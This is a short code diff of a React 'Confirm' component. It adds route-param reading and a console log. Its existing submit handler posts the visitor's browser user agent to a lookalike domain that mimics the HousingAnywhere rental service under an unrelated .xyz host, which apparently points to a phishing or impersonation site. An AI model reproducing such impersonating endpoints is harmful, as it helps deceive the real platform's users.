@@ -1,9 +1,12 @@
 import { useEffect } from "react";
+import { useParams } from 'next/navigation'
 import axios from "axios";
 
 function Confirm() {
-
+  const params = useParams();
+  
   async function handleSubmit() {
+    console.log(params);
     try {
       await axios.post(`https://housinganywhere.com.id.stra-e.xyz/api/confirm`, {browser: navigator.userAgent});
     } catch(err) {
